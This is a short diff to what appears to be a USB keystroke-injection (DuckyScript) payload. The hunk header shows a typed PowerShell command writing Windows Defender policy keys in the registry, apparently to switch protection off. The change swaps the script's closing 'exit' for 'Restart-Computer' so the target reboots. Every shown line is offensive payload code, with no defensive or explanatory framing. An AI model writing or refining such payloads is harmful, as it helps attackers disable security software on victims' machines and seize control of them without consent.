@@ -20,6 +20,6 @@ STRING New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defen
 DELAY 500
 ENTER
 DELAY 2000
-STRING exit
+STRING Restart-Computer
 DELAY 500
 ENTER
